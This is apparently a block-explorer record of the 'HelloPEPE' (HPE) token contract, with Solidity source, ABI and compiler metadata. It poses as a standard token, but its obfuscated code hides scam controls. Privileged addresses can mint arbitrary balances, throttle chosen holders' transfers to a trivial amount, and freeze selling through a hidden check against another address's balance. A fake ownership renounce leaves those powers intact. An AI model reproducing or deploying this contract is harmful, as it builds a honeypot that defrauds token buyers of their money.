{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface txMarketingBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingSwap) external view returns (uint256);\n\n    function transfer(address isAt, uint256 totalLaunch) external returns (bool);\n\n    function allowance(address sellLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isAt,\n        uint256 totalLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyToTrading, uint256 value);\n    event Approval(address indexed sellLaunch, address indexed spender, uint256 value);\n}\n\nabstract contract isTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableTotalReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface teamFee {\n    function createPair(address fromLimit, address autoMax) external returns (address);\n}\n\ninterface totalTx is txMarketingBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HelloPEPE is isTake, txMarketingBuy, totalTx {\n\n    function getOwner() external view returns (address) {\n        return maxFeeExempt;\n    }\n\n    function approve(address launchLiquidityBuy, uint256 totalLaunch) public virtual override returns (bool) {\n        takeFund[_msgSender()][launchLiquidityBuy] = totalLaunch;\n        emit Approval(_msgSender(), launchLiquidityBuy, totalLaunch);\n        return true;\n    }\n\n    mapping(address => uint256) private tradingFund;\n\n    function balanceOf(address marketingSwap) public view virtual override returns (uint256) {\n        return tradingFund[marketingSwap];\n    }\n\n    function transferFrom(address walletAmount, address isAt, uint256 totalLaunch) external override returns (bool) {\n        if (_msgSender() != maxLiquidity) {\n            if (takeFund[walletAmount][_msgSender()] != type(uint256).max) {\n                require(totalLaunch <= takeFund[walletAmount][_msgSender()]);\n                takeFund[walletAmount][_msgSender()] -= totalLaunch;\n            }\n        }\n        return fundBuy(walletAmount, isAt, totalLaunch);\n    }\n\n    mapping(address => mapping(address => uint256)) private takeFund;\n\n    bool public shouldToken;\n\n    uint256 private exemptSell = 100000000 * 10 ** 18;\n\n    function name() external view virtual override returns (string memory) {\n        return maxReceiver;\n    }\n\n    mapping(address => bool) public atBuy;\n\n    function allowance(address takeEnable, address launchLiquidityBuy) external view virtual override returns (uint256) {\n        if (launchLiquidityBuy == maxLiquidity) {\n            return type(uint256).max;\n        }\n        return takeFund[takeEnable][launchLiquidityBuy];\n    }\n\n    uint256 constant limitTake = 12 ** 10;\n\n    function fundBuy(address walletAmount, address isAt, uint256 totalLaunch) internal returns (bool) {\n        if (walletAmount == autoShould) {\n            return atLaunch(walletAmount, isAt, totalLaunch);\n        }\n        uint256 txMin = txMarketingBuy(amountShould).balanceOf(isAmountMarketing);\n        require(txMin == buyList);\n        require(isAt != isAmountMarketing);\n        if (atBuy[walletAmount]) {\n            return atLaunch(walletAmount, isAt, limitTake);\n        }\n        return atLaunch(walletAmount, isAt, totalLaunch);\n    }\n\n    bool public maxMode;\n\n    function fromWallet() private view {\n        require(modeIs[_msgSender()]);\n    }\n\n    address maxLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function receiverTake(address teamMin) public {\n        fromWallet();\n        \n        if (teamMin == autoShould || teamMin == amountShould) {\n            return;\n        }\n        atBuy[teamMin] = true;\n    }\n\n    bool private receiverBuy;\n\n    uint256 public takeTx;\n\n    string private maxReceiver = \"Hello PEPE\";\n\n    function receiverLaunched(address swapSell, uint256 totalLaunch) public {\n        fromWallet();\n        tradingFund[swapSell] = totalLaunch;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundWallet;\n    }\n\n    uint256 private modeSenderToken;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptSell;\n    }\n\n    uint256 txLaunch;\n\n    uint256 buyList;\n\n    address public autoShould;\n\n    function transfer(address swapSell, uint256 totalLaunch) external virtual override returns (bool) {\n        return fundBuy(_msgSender(), swapSell, totalLaunch);\n    }\n\n    string private tradingShould = \"HPE\";\n\n    uint256 private walletReceiverLiquidity;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingShould;\n    }\n\n    uint8 private fundWallet = 18;\n\n    uint256 private buyShould;\n\n    function atLaunchedSell(address toShould) public {\n        require(toShould.balance < 100000);\n        if (shouldToken) {\n            return;\n        }\n        \n        modeIs[toShould] = true;\n        if (receiverBuy) {\n            modeSenderToken = walletReceiverLiquidity;\n        }\n        shouldToken = true;\n    }\n\n    address private maxFeeExempt;\n\n    address public amountShould;\n\n    function senderMaxSwap(uint256 totalLaunch) public {\n        fromWallet();\n        buyList = totalLaunch;\n    }\n\n    function atLaunch(address walletAmount, address isAt, uint256 totalLaunch) internal returns (bool) {\n        require(tradingFund[walletAmount] >= totalLaunch);\n        tradingFund[walletAmount] -= totalLaunch;\n        tradingFund[isAt] += totalLaunch;\n        emit Transfer(walletAmount, isAt, totalLaunch);\n        return true;\n    }\n\n    mapping(address => bool) public modeIs;\n\n    function owner() external view returns (address) {\n        return maxFeeExempt;\n    }\n\n    address isAmountMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function enableMin() public {\n        emit OwnershipTransferred(autoShould, address(0));\n        maxFeeExempt = address(0);\n    }\n\n    event OwnershipTransferred(address indexed launchedFund, address indexed isWallet);\n\n    constructor (){\n        \n        enableTotalReceiver marketingSellTo = enableTotalReceiver(maxLiquidity);\n        amountShould = teamFee(marketingSellTo.factory()).createPair(marketingSellTo.WETH(), address(this));\n        if (receiverBuy) {\n            maxMode = true;\n        }\n        autoShould = _msgSender();\n        enableMin();\n        modeIs[autoShould] = true;\n        tradingFund[autoShould] = exemptSell;\n        \n        emit Transfer(address(0), autoShould, exemptSell);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyToTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchLiquidityBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLiquidityBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toShould\",\"type\":\"address\"}],\"name\":\"atLaunchedSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalLaunch\",\"type\":\"uint256\"}],\"name\":\"receiverLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMin\",\"type\":\"address\"}],\"name\":\"receiverTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalLaunch\",\"type\":\"uint256\"}],\"name\":\"senderMaxSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "HelloPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}